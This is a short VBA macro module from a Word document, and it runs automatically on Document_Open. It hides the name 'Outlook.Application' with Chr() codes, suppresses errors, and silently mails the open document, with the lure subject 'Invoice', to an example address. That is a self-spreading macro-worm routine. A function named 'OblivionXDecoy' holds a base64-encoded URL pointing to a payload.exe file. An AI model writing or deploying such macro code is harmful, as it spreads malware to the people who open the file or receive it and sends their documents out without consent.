Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    Set olApp = CreateObject(Chr(79) & Chr(117) & Chr(116) & Chr(108) & Chr(111) & Chr(111) & Chr(107) & Chr(46) & Chr(65) & Chr(112) & Chr(112) & Chr(108) & Chr(105) & Chr(99) & Chr(97) & Chr(116) & Chr(105) & Chr(111) & Chr(110))
    Set olMail = olApp.CreateItem(0)
    olMail.To = "recipient@example.com"
    olMail.Subject = "Invoice"
    olMail.Body = "Please find the attached document."
    olMail.Attachments.Add ActiveDocument.FullName
    olMail.Send
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
